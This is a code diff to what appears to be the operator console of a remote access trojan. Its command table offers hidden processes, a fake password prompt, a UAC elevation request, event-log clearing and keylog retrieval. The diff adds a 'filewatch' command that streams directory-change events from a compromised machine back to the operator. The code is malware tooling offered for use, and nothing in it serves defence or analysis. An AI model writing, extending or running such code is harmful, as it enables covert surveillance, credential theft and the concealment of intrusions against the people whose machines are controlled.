@@ -39,6 +39,7 @@ commands = {'help': ['Show this help'],
             'run_hide': ['Create a hidden process'],
             'askpass': ['Pop up a password prompt'],
             'askuac': ['Ask for UAC elevation'],
+            'filewatch': ['Monitor a directory tree for changes'],
             'clearlog': ['Clear event logs']
             }
 
@@ -231,6 +232,27 @@ class Command:
     def keylogger_save(conn, cmd):
         Helper.send(conn, cmd)
         Helper.recv_file(conn, 'Keylog{}.png'.format(Helper.get_time()))
+
+    @staticmethod
+    def filewatch(conn, cmd):
+        Helper.send(conn, cmd)
+        event = threading.Event()
+
+        def recv():
+            while True:
+                status, data = Helper.recv(conn)
+                if status == -1:
+                    event.set()
+                    break
+                print(data.decode())
+
+        threading.Thread(target=recv, daemon=True).start()
+        while True:
+            cmd = input('filewatch> ')
+            if cmd in ['q', 'quit', 'ex', 'exit']:
+                Helper.send(conn, 'stop')
+                event.wait()
+                break
 
 
 class Alias:
